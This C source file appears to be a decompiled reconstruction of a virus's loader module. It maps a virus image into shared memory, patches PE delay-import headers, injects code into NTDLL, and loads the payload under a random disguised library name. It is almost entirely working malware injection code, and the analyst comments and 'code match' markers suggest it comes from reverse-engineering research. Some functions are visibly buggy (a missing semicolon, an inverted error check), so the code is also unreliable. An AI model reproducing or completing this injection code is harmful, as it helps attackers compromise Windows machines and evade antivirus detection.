/******************************************************************************************
  Copyright 2012-2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/
// MODIFIED BY mic.ric.tor

#include "MemorySections.h"

// 95% (C) CODE MATCH
INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVOID pVirusModule, INT32 pVirusModuleSize, INT32 iExecEntryNumber, PVOID pUnknownSegment, UINT32 pUnknownSegmentSize, PVOID *pOutSection)
{
	HANDLE hMapHandle; // [sp+4h] [bp-28h]@1
	PVOID pVirusImageBase; // [sp+8h] [bp-24h]@3
	PIMAGE_NT_HEADERS pImageNT; // [sp+Ch] [bp-20h]@6
	PIMAGE_DOS_HEADER pImageDOS; // [sp+18h] [bp-14h]@3
	PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader; // [sp+24h] [bp-8h]@3

	PVOID pCurrAddr = 0;
	PVOID pBaseAddr = 0;

	INT32 iSectionPointer  = 0;
	UINT32 iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;

	INT32 iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pCurrAddr, &pBaseAddr);
	if(iOpenMapViewFailed)
		return iOpenMapViewFailed;

	sVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pBaseAddr;
	pCurrAddr                = (PVOID)((DWORD)pCurrAddr + sizeof(VIRUS_MODULE_BLOCKS_HEADER));

	// Don't overwrite the header
	iSectionPointer          = sizeof(VIRUS_MODULE_BLOCKS_HEADER);

	CopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);
	pVirusImageBase = pCurrAddr;

	CopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);
	pImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;

	// if virusmodule has "MZ" magic for .exe and virus is within size bounds
	if((UINT32)pVirusModuleSize >= 0x1000 &&
	   pImageDOS->e_magic == MZ_HEADER &&
	   pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) < (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section ".text"
	{
		pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusImageBase + pImageDOS->e_lfanew);

		// According to the below references, each entry in the delay import table is 32 bits
		//  so what the actual fuck is going on here. I suppose delayed injection would be a good way
		//  of dodging an AV's runtime check, as the virus is loaded into memory as-needed.
		// Still wouldn't explain why we're subtracting 8 from the Size
		// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680305(v=vs.85).aspx
		// http://svn.wildfiregames.com/docs/structImgDelayDescr.html
		if(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)
			pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size = 64; // Change Delay Import Directory Size
	}

	__memcpy(&sVirusModuleBlocksHeader->InformationBlock, sInfoBlock, sizeof(GENERAL_INFO_BLOCK));

	sVirusModuleBlocksHeader->LibraryExecuteEntryNumber = iExecEntryNumber;
	sVirusModuleBlocksHeader->VirusModulePointer        = 0;

	*pOutSection = pBaseAddr;

	g_hardAddrs.UnmapViewOfFile(pBaseAddr); // Also unmaps sVirusModuleBlocks header
	g_hardAddrs.ZwClose(hMapHandle);

	return 0;
}

// 96% (C) CODE MATCH
INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader, PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader, PGENERAL_INFO_BLOCK sInfoBlock)
{
	HMODULE pVirusModule; // [sp+0h] [bp-90h]@5
	HANDLE hMappedAddress; // [sp+4h] [bp-8Ch]@7
	INT32 iResult; // [sp+8h] [bp-88h]@1
	PHARDCODED_ADDRESSES pHardAddrs; // [sp+Ch] [bp-84h]@1

	GENERAL_INFO_BLOCK sInfoBlockCopy;
	__memcpy(&sInfoBlockCopy, sInfoBlock, sizeof(GENERAL_INFO_BLOCK)); // Copy the information

	sInfoBlockCopy.OriginalAddress ^= XADDR_KEY; // Get the original address of the variable sInfoBlock
	sInfoBlockCopy.UnknownZero0     = 0;

	// Point to g_hardAddrs in memory
	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));

	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress, sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);
	if(iResult)
		return iResult

	if(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs))
		return -4;

	/* Load library from the memory */
	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
	if(!pVirusModule) return -9;

	sVirusModuleBlocksHeader->VirusModulePointer = pVirusModule;
	hMappedAddress = sInfoBlockCopy.MappedAddress;

	if(sInfoBlockCopy.MappedAddress)
	{
		sInfoBlockCopy.MappedAddress = 0;
		pHardAddrs->ZwClose(hMappedAddress);
	}

	return 0;
}

// 100% (C) CODE MATCH
UINT32 GetCodeBlockSize(void)
{
	return _SIZE(BLOCK4_END, BLOCK4_InjectAndExecuteVirus);
}

// 100% (C) CODE MATCH
UINT32 GetCodeBlock(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
{
	return (INT32)BLOCK4_InjectAndExecuteVirus(sASMCodeBlocksHeader);
}

// 100% (C) CODE MATCH
UINT32 GetRelativeExecuteLibraryPointer(void)
{
	return _SIZE(BLOCK4_ExecuteLibrary, BLOCK4_InjectAndExecuteVirus);
}

// 100% (C) CODE MATCH
UINT32 GetRelativeAlignAddressesPointer(void)
{
	return _SIZE(BLOCK4_AlignAddresses, BLOCK4_InjectAndExecuteVirus);
}

// 85% (C) CODE MATCH -> NEED DEBUG
INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *pCodeBlockPointer, PVOID *pAssemblyCodeBlocksSection)
{
	HANDLE pSectionHandle;
	PVOID pBaseAddr1 = 0;
	PVOID pViewBase = 0;
	INT32 iSectionPointer = 0;


	UINT32 iCodeBlockSize = GetCodeBlockSize(); // [0xB3A] (2874)
	UINT32 iASMBlock1Size = _SIZE(DecodeFunctionNameA, __ASM_BLOCK1_0);
	UINT32 iASMBlock0Size = _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0);

	UINT32 iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock0Size + iASMBlock1Size + iCodeBlockSize;


	// Because hHandle = GetCurrentProcess(), pBaseAddr1 == pViewBase
	INT32 iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &pSectionHandle, &pBaseAddr1, &pViewBase);
	if(!iOpenMapViewFailed)
		return iOpenMapViewFailed;

	PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pBaseAddr1;

	// Pointer to first address to write
	PVOID pCurrBase           = (PVOID)((DWORD)pBaseAddr1 + sizeof(ASM_CODE_BLOCKS_HEADER));

	// Offset from baseAddr of where we're currently writing
	iSectionPointer      = sizeof(ASM_CODE_BLOCKS_HEADER);

	CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, iASMBlock1Size);

	CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, iASMBlock0Size);

	PVOID pCodeBlock = (PVOID)GetCodeBlock(sASMCodeBlocksHeader);
	CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);

	// Basically memcpy:
	//   *__ASM_BLOCK0_1 = &__ASM_REF_3
	//   I have no idea why.
	DWORD *tmp = (DWORD *)((DWORD)sASMCodeBlocksHeader + sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock1Size + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
	*tmp = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);

	// Put function address into the memory map
	sASMCodeBlocksHeader->ExecuteLibrary = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeExecuteLibraryPointer();
	sASMCodeBlocksHeader->AlignAddresses = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeAlignAddressesPointer();
	sASMCodeBlocksHeader->VirusModuleSection = (DWORD)pVirusModuleSection;

	// Put the values in the pointers
	*pCodeBlockPointer          = (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;
	*pAssemblyCodeBlocksSection = pViewBase;

	// Close and unmap the first section
	g_hardAddrs.UnmapViewOfFile(sASMCodeBlocksHeader);
	g_hardAddrs.ZwClose(pSectionHandle);

	return 0;
}

// 98% (C) CODE MATCH
INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSize, HMODULE *hVirusModule)
{
	INT32 iResult; // [sp+0h] [bp-84h]@5
	GENERAL_INFO_BLOCK sInfoBlock; // [sp+4h] [bp-80h]@1

	// Get a random module name with the format "KERNEL32.DLL.ASLR.XXXXXXXX"
	if(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0)
		return 0;

	// Decrypt the Kernel32's and NTDLL's function names
	if(bSetup && DecodeEncryptedModuleNames() == FALSE)
		return -12;

	iResult = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
	if(iResult)
		return iResult;

	// One-time
	if(bSetup)
	{
		iResult = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR, &s_codeBlockPTR, &s_ASMCodeBlocksPTR);
		if(iResult) return iResult;

		bSetup = FALSE;
	}

	iResult = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR, (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR, &sInfoBlock);
	if(!iResult)
		*hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;

	g_hardAddrs.UnmapViewOfFile(s_virusBlocksPTR);

	return iResult;
}